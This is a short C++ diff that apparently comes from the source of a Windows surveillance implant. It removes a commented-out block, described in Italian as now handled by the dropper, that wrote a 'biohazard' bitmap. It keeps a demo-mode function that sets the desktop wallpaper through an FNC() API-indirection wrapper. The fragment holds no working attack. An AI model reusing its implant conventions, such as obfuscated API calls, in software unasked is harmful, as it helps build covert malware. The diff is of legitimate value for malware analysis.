@@ -12,23 +12,14 @@ HWND g_report_hwnd = NULL;
 BOOL is_exit_scheduled = FALSE;
 std::string g_log_report = "";
 
-
 void SetDesktopBackground()
 { 
-	HANDLE hfile;
-	DWORD dummy;
 	char bitmap_path[_MAX_PATH + 1];
 
 	if (!shared.is_demo_version)
 		return;
 
 	HM_CompletePath(DESKTOP_BMP_NAME, bitmap_path);
-	// Adesso il file nella versione demo viene scritto dal dropper
-	/*hfile = FNC(CreateFileA)(bitmap_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, NULL, NULL);
-	if (hfile != INVALID_HANDLE_VALUE) {
-		FNC(WriteFile)(hfile, biohazard_bmp, biohazard_bmp_len, &dummy, NULL);
-		CloseHandle(hfile);
-	}*/
 	FNC(SystemParametersInfoA)(SPI_SETDESKWALLPAPER, 0, bitmap_path, 0);
 }
 
